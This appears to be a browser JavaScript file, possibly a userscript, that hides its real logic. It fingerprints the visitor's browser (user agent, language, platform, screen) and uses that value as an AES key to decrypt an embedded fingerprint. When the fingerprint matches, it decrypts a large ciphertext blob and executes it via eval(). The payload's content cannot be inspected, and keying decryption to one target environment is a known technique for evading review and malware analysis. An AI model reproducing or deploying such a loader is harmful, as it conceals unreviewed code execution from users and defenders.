


(function() {
    'use strict';

    function loadCryptoJS(callback) {
        const script = document.createElement('script');
        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js';
        script.onload = callback;
        document.head.appendChild(script);
    }

    function decrypt(text, key) {
        try {
            const bytes = CryptoJS.AES.decrypt(text, key);
            return bytes.toString(CryptoJS.enc.Utf8);
        } catch (e) {
            console.error('Error decrypting:', e);
            return '';
        }
    }

    function gerarFingerprint() {
        const navigatorData = window.navigator;
        const fingerprint = [
            navigatorData.userAgent,
            navigatorData.language,
            navigatorData.platform,
            `${window.screen.width}x${window.screen.height}`,
            window.screen.colorDepth
        ].join('|');
        return fingerprint;
    }

    const encryptedCode = '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';
    const encryptedFingerprint = 'U2FsdGVkX1++YszMOfMof6hWTtq8cMYRE+KnC53dKpUofffB5p9G9494CE2fgUevlHGHwHgq/khEtetcBNM1lehZp40Ya/7d87iEWOczfBOJ+HMtNCxrA/HjEWzJzKbiivZGff3DL8JbFozHhZ2p5ruyWpyDO0Nw9FyKld+2/SBWvmSgOF2cc4CG9w9RpN4vEiuOO5AolXOCBTTBkS5bpyM15113YhNcQRIhZgT3LR7CMgZ3zw9j4s+UmLjt7xFq';
    const key = gerarFingerprint();

    loadCryptoJS(function() {
        const decryptedFingerprint = decrypt(encryptedFingerprint, key);
        if (gerarFingerprint() === decryptedFingerprint) {
            const decryptedCode = decrypt(encryptedCode, key);
            try {
                eval(decryptedCode);
            } catch (e) {
                console.error('Error evaluating code:', e);
            }
        } else {
            console.error('Fingerprint does not match.');
        }
    });
})();
        
